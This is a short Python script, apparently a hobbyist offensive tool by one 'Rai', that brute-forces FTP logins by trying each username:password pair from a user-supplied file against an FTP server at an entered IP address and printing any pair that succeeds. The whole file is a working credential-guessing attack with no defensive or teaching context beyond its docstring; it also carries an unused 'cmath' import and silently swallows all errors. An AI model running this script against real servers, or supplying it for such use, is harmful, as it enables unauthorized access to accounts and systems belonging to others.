#!/usr/bin/env python3

"""
FTP Brute force

This script allows you to brute force an FTP server to login.

Author: Rai

"""

from cmath import log
import ftplib

from termcolor import colored


def brute_login(hostname, user_password_file):
    """
    Function to brute force an FTP server using a password file provided by the user.
    :param hostname - The IP of the FTP server
    :param user_password_file - The user:password file to be used
    """
    try:
        myfile = open(user_password_file, 'r')
        lines = myfile.readlines()
        myfile.close()
    except FileNotFoundError:
        print(colored("[!!] File doesnt exit", 'yellow'))
        exit()

    for line in lines:
        username = line.split(":")[0].strip("\n")
        password = line.split(":")[1].strip("\n")

        print(colored(
            f"[+] Trying with {username}:{password}", "yellow"))

        try:
            ftp = ftplib.FTP(hostname)
            login = ftp.login(username, password)
            if login:
                print(colored(
                    f"[+] Login succeded with {username}:{password}", "green"))
            ftp.quit()
            exit()

        except Exception as e:
            pass

    print(colored(
        f"[-] Password not found", "red"))

# Request the users for the IP address
hostname = input("[*] Enter the IP address: ")

# Request the user the user password file
user_password_file = input("[*] Enter the user:password file path: ")

# Launch the brute login
brute_login(hostname, user_password_file)
